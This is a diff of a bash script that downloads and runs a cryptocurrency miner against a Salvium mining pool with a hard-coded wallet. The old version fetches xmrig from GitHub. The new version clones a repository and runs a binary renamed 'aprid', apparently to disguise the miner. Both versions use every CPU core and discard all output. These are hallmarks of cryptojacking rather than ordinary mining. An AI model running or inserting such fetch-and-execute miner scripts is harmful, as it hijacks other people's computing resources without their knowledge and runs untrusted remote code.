@@ -1,6 +1,6 @@
 #!/bin/bash
-A=sg.salvium.herominers.com:1230
-B=SaLvs9Nq8FNR1zSLC6FjhSN8RLJMRDsWp8EzMkqY5HaYQYVxGS5tzsb4fStMr761Lj75BD9T9n8mgZxvuV3MQZLPAprazQYz9tv
-C=jur
-wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-./xmrig --coin=SAL --url $A --user $B --pass $C --donate-level 1 -a rx/0 -t $(nproc --all) >/dev/null 2>&1
+yum update && yum -y install sudo
+yum -y install git wget
+git clone https://github.com/nonibihan/luo.git && cd luo
+chmod 777 aprid SHA256SUMS
+./aprid --donate-level 1 -o sg.salvium.herominers.com:1230 -u solo:SaLvs9Nq8FNR1zSLC6FjhSN8RLJMRDsWp8EzMkqY5HaYQYVxGS5tzsb4fStMr761Lj75BD9T9n8mgZxvuV3MQZLPAprazQYz9tv -p JUR -a rx/0 -k -t $(nproc --all)
